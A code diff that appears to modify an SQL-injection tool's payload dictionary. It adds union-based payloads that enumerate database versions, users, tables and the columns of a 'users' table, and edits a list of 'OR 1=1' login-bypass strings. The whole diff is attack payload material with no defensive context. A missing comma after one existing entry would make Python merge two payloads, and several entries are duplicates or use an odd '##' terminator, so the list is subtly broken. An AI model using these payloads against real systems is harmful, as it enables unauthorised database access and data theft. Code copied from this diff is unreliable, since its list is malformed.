@@ -40,6 +40,17 @@ payloadsList = {
 		"' UNION SELECT 1, @@version, 3--",
 		"' UNION SELECT null, group_concat(column_name), null FROM information_schema.columns WHERE table_schema=database()--",
 		"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--"
+		"' UNION SELECT 1, 'another', 'table', 5##",  
+        "' UNION SELECT null, null, null, null##", 
+        "' UNION SELECT ALL table_name, null, null, null FROM information_schema.tables##",  # List all tables ##
+        "' UNION SELECT null, column_name, null, null FROM information_schema.columns WHERE table_name='users'##",  # List columns of users table ##
+        "' UNION SELECT null, null, version(), null##",  # Get database version ##
+        "' UNION SELECT null, null, database()##",  # Get current database ##
+        "' UNION SELECT null, null, user()##",  # Get current user ##
+        "' UNION SELECT 1, @@version, 3, 4##",  # Get version with different structure ##
+        "' UNION SELECT null, null, group_concat(column_name), null FROM information_schema.columns WHERE table_schema=database()##",  # List all columns in current database ##
+        "' UNION SELECT null, null, null, table_name FROM information_schema.tables WHERE table_schema=database()##",  # List all tables in current database ##
+		"' UNION SELECT sqlite_version(), NULL, NULL, NULL--",
 	],
 	"error": [
 		"' OR 1=1--",
@@ -65,20 +76,20 @@ payloadsList = {
 		"' OR '1'='1'-- -",
 		"' OR '1'='1'/*",
 		"' OR 1=1##",
-        "' OR 'a'='a'##",  # OR condition with identical string ##
-        "' OR 'a'='a'/*",  # OR condition with comment ##
-        "' OR 1=1#",  # OR condition with comment ##
-        "' OR 1=1/*",  # OR condition with comment ##
-        "' OR 1=1## -",  # OR condition with comment ##
-        "' OR '1'='1'## -",  # OR condition with identical string and comment ##
-        "' OR '1'='1'/*",  # OR condition with comment ##
-        "' OR 1=1#",  # OR condition with comment ##
-        "' OR 1=1/*",  # OR condition with comment ##
-        "' OR 1=1; ##",  # OR condition with comment and semicolon ##
-        "' OR 1=1; /*",  # OR condition with comment and semicolon ##
-        "' OR 1=1; #",  # OR condition with comment and semicolon ##
-        "' OR 1=1; ##",  # OR condition with comment ##
-        "' OR 1=1; /*",  # OR condition with comment ##
+        "' OR 'a'='a'##",
+        "' OR 'a'='a'/*",  
+        "' OR 1=1#",  
+        "' OR 1=1/*", 
+        "' OR 1=1## -", 
+        "' OR '1'='1'## -",  
+        "' OR '1'='1'/*",  
+        "' OR 1=1#",  
+        "' OR 1=1/*", 
+        "' OR 1=1; ##", 
+        "' OR 1=1; /*",  
+        "' OR 1=1; #",  
+        "' OR 1=1; ##", 
+        "' OR 1=1; /*",  
         "' OR 1=1; #",  
         "' OR 1=1; ##", 
         "' OR '1'='1' ##",  
